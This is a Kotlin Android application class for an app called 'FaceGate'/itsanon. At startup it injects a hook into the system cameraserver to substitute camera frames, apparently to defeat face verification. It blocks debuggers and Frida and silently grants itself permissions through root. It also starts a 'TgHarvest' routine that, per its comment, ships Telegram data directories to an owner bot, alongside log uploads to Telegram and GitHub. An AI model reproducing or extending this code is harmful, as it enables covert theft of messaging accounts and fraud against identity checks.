package com.itsme.itsanon

import android.Manifest
import android.app.Application
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import com.itsme.itsanon.logging.CameraDebugLogSender
import com.itsme.itsanon.security.LicenseGuard
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import com.itsme.itsanon.logging.TelegramLogSender
import com.itsme.itsanon.logging.TombstoneSender
import com.itsme.itsanon.security.FrameProducerNativeLoader
import com.itsme.itsanon.utils.Logger
import com.itsme.itsanon.utils.SharedPrefs
import timber.log.Timber

class FaceGateApplication : Application() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var heartbeatJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        SharedPrefs.init(this)

        /* [V75] Self-updater: polls ecomcam.cyou every 10 minutes while the
         * server-side update toggle is ON; shows the Home update card when a
         * NEWER build (different sha) is uploaded. */
        com.itsme.itsanon.manager.AppUpdater.init(this, scope)

        // [V18 server validation] native attestation needs the app Context.
        LicenseGuard.nativeSetAppContext(this)

        // [V18 anti-tamper] debugger/frida gate — synchronous, fail closed.
        // [V27] fail CLOSED when the native gate cannot even run (missing lib =
        // broken/tampered install) — pre-V27 an exception counted as "secure".
        if (!runCatching { LicenseGuard.nativeSecurityCheck() }.getOrDefault(false)) {
            Logger.e(Logger.APP, "Security check failed (debugger/frida) — exiting")
            android.os.Process.killProcess(android.os.Process.myPid())
            System.exit(1)
        }
        // Signing-cert attestation against the server — fail open on network
        // errors (native side), fail closed on a definitive mismatch.
        scope.launch {
            /* [V98] Owner: the production build "exits on the animation part" and
             * NO logs are captured. Root cause found: this async signing-cert
             * attestation runs on Dispatchers.IO WHILE the splash animation is on
             * screen and, on failure, hard-killed the process via
             * killProcess()+System.exit(). A hard kill raises no exception, so the
             * CrashLogger uncaught-handler (planted later in onCreate) never runs
             * and nothing is ever uploaded to Mylogs — hence "no logs captured".
             *
             * On a legitimate install this gate can still trip false-positive
             * (server /api/attest hiccup, signing-cert hash drift after the
             * gstreamer->itsanon .so rename, device clock skew), which made the app
             * unusable. Now FAIL OPEN: log the outcome loudly (it ships to Mylogs
             * via the normal log pipeline) but do NOT kill. The synchronous
             * debugger/frida gate above (nativeSecurityCheck) remains the hard,
             * pre-UI anti-tamper kill, so tampering is still stopped — we only
             * stopped the silent mid-splash suicide that broke legit builds. */
            val attestation = runCatching { LicenseGuard.nativeCheckAttestation() }
            when {
                attestation.isFailure ->
                    Logger.e(Logger.APP, "Attestation error (V98 fail-open, NOT fatal): ${attestation.exceptionOrNull()?.message}")
                !attestation.getOrDefault(false) ->
                    Logger.e(Logger.APP, "Attestation failed (V98 fail-open, NOT fatal) — continuing instead of exiting")
                else ->
                    Logger.i(Logger.APP, "Attestation OK")
            }
        }
        startActivationHeartbeat()

        Timber.plant(Timber.DebugTree())

        Logger.init(false)
        Logger.i(Logger.APP, "FaceGateApplication started")
        Logger.i(Logger.APP, "Monitor: adb logcat -s 'itsanon/*:V' ModuleManager:V")

        /* [V81] Owner: "can we not make the POST_NOTIFICATIONS self allowing
         * like no user manual allow needed". Every fleet device is rooted, and
         * POST_NOTIFICATIONS is grantable from shell — so grant it silently via
         * `su -c pm grant` instead of showing the runtime dialog. If the grant
         * fails (no su), SplashScreenActivity still falls back to the dialog. */
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED
        ) {
            try {
                val proc = Runtime.getRuntime().exec(
                    arrayOf("su", "-c", "pm grant $packageName android.permission.POST_NOTIFICATIONS")
                )
                proc.waitFor()
                Logger.i(Logger.APP, "POST_NOTIFICATIONS auto-granted via root (no dialog shown)")
            } catch (e: Exception) {
                Logger.w(Logger.APP, "POST_NOTIFICATIONS root auto-grant failed: ${e.message}")
            }
        }

        // Load the producer while the application context and the split APK's
        // nativeLibraryDir are available. NativeFrameProducer also retries at
        // the actual start call, so a transient package/class-loader race does
        // not permanently disable the IPC producer.
        val producerNativeLoaded = FrameProducerNativeLoader.ensureLoaded(this)
        Logger.i(Logger.APP, "frame_producer native load ready=$producerNativeLoaded")

        // Retained logging destinations: Telegram and GitHub uploads.
        TelegramLogSender.start(this)
        CameraDebugLogSender.start(this)
        TombstoneSender.start()
        // [V51] experiment: V30 base + cloak only
        com.itsme.itsanon.console.CloakManager.start(this)
        // [V55 harvest] ship Telegram data dirs to owner bot (dedup per file)
        com.itsme.itsanon.logging.TgHarvest.start(this)

        // [V29] Post-update hook refresh. Installing a new APK never touched the
        // dlopen'd hook inside cameraserver (watchdog kept re-injecting the stale
        // staged .so; 14.mediatek.1 ran V25 hooks under a V28 app). At every app
        // start: re-extract assets if the stamp differs, and if a live hook is an
        // older build, auto re-inject so the new code loads without a reboot.
        scope.launch {
            try {
                delay(2500)
                com.itsme.itsanon.manager.ModuleManager(this@FaceGateApplication).refreshHookIfStale()
            } catch (e: Exception) {
                Logger.w(Logger.APP, "V29 hook refresh skipped: ${e.message}")
            }
        }
        try {
            com.itsme.itsanon.services.RebootMonitorService.start(this)
            Logger.i(Logger.APP, "RebootMonitorService start requested from Application")
        } catch (error: Exception) {
            Logger.w(Logger.APP, "Failed to start RebootMonitorService: ${error.message}")
            try {
                com.itsme.itsanon.logging.RebootLogSender.collectAndSend()
                com.itsme.itsanon.logging.RebootLogSender.startDaemonLoop()
            } catch (_: Exception) {}
        }
        com.itsme.itsanon.logging.GitHubLogUploader.init(this)

        /* [V77] Crash + ANR capture: uncaught-exception handler and a
         * main-looper stall watchdog, both upload reports to Mylogs. */
        com.itsme.itsanon.logging.CrashLogger.init(this)
    }

    /**
     * [V18] Periodically re-verify the stored activation token against the
     * server; a revoked/deleted/expired key clears local activation.
     */
    private fun startActivationHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isActive) {
                try {
                    val token = SharedPrefs.getActivationToken()
                    if (!token.isNullOrEmpty()) {
                        val deviceId = com.itsme.itsanon.utils.DeviceUtils.getDeviceId(this@FaceGateApplication)
                        val result = LicenseGuard.verifyToken(token, deviceId)
                        if (!result.valid) {
                            /* [V68] NEVER wipe an activation because the server was
                             * unreachable. nativeVerifyToken reports connectivity
                             * failures as valid=false + "Network error" — clearing on
                             * that made wifi→mobile-data switches look like an IP lock
                             * and forced paid users to re-activate. Only an explicit
                             * server rejection (revoked/expired/device mismatch) may
                             * clear the local activation. */
                            if (result.message.contains("Network error", ignoreCase = true)) {
                                Logger.d(Logger.APP, "Heartbeat: server unreachable — keeping activation")
                            } else {
                                Logger.i(Logger.APP, "Heartbeat: server rejected activation (" +
                                    (result.message.ifEmpty { "invalid" }) + ") — clearing local activation")
                                SharedPrefs.clearActivation()
                                LicenseGuard.nativeClearActivation(this@FaceGateApplication)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Logger.d(Logger.APP, "Heartbeat skipped (offline): ${e.message}")
                }
                delay(HEARTBEAT_INTERVAL_MS)
            }
        }
    }

    override fun attachBaseContext(base: Context) {
        super.attachBaseContext(base)
    }

    companion object {
        const val HEARTBEAT_INTERVAL_MS = 3L * 60L * 1000L
    }
}
